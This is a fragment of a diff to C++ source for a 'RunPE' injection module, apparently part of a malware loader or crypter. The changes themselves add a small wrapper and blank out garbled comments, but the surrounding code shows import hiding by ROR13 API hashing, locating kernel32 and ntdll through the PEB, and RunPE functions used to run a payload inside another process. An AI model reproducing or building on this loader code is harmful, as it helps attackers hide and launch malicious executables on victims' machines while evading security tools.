@@ -1,4 +1,8 @@
+#include "RunPE.hpp"
 
+DWORD Kernel32::pGetProcessId(HANDLE Process){
+	return GetProcessId(Process);
+}
 
 int	Inject::RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 {
@@ -43,7 +47,7 @@ int	Inject::RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 	*(DWORD_PTR*)&pVirtualAlloc = get_proc_address(hKernel32, 0x302ebe1c);
 	//*(DWORD_PTR*)&memset = get_proc_address(hNtdll, 0x1c2c653b);
 
-	// ��� ������
+	//           
 	//int (WINAPI * pMessageBoxA)(__in_opt HWND hWnd, __in_opt LPCSTR lpText, __in_opt LPCSTR lpCaption, __in UINT uType);
 	//char ccc[11];
 	//ccc[0] = 'u'; ccc[1] = 's'; ccc[2] = 'e'; ccc[3] = 'r'; ccc[4] = '3'; ccc[5] = '2'; ccc[6] = '.'; ccc[7] = 'd'; ccc[8] = 'l'; ccc[9] = 'l'; ccc[10] = 0;
@@ -199,7 +203,7 @@ int	Inject::RunPESelf(void* lpFile, DWORD szFile, LPWSTR args)
 	*(DWORD_PTR*)&pVirtualAlloc = get_proc_address(hKernel32, 0x302ebe1c);
 	//*(DWORD_PTR*)&memset = get_proc_address(hNtdll, 0x1c2c653b);
 
-	// ��� ������
+	//           
 	//int (WINAPI * pMessageBoxA)(__in_opt HWND hWnd, __in_opt LPCSTR lpText, __in_opt LPCSTR lpCaption, __in UINT uType);
 	//char ccc[11];
 	//ccc[0] = 'u'; ccc[1] = 's'; ccc[2] = 'e'; ccc[3] = 'r'; ccc[4] = '3'; ccc[5] = '2'; ccc[6] = '.'; ccc[7] = 'd'; ccc[8] = 'l'; ccc[9] = 'l'; ccc[10] = 0;
@@ -317,7 +321,7 @@ int	Inject::RunPESelf(void* lpFile, DWORD szFile, LPWSTR args)
 	return -1;
 }
 
-// ��������� ����� PEB ������ kernel32.dll
+//                 PEB        kernel32.dll
 DWORD_PTR Inject::get_kernel32base()
 {
 	void *vp;
@@ -333,7 +337,7 @@ DWORD_PTR Inject::get_kernel32base()
 	return (DWORD_PTR)vp;
 }
 
-// ��������� ����� PEB ������ ntdll.dll
+//                 PEB        ntdll.dll
 DWORD_PTR Inject::get_ntdllbase()
 {
 	void *vp;
@@ -349,19 +353,19 @@ DWORD_PTR Inject::get_ntdllbase()
 	return (DWORD_PTR)vp;
 }
 
-// ��������� ����
+//               
 DWORD Inject::get_hash(const char *str) {
 	DWORD h;
 	h = 0;
 	while (*str) {
 		h = (h >> 13) | (h << (32 - 13));       // ROR h, 13
-		h += *str >= 'a' ? *str - 32 : *str;    // ������������ ������� � ������� �������
+		h += *str >= 'a' ? *str - 32 : *str;    //                                       
 		str++;
 	}
 	return h;
 }
 
-// ��������� ������ ������� � ���
+//                               
 DWORD_PTR Inject::get_proc_address(DWORD_PTR pDLL, DWORD dwAPI)
 {
 	IMAGE_DOS_HEADER* pIDH = (IMAGE_DOS_HEADER*)pDLL;
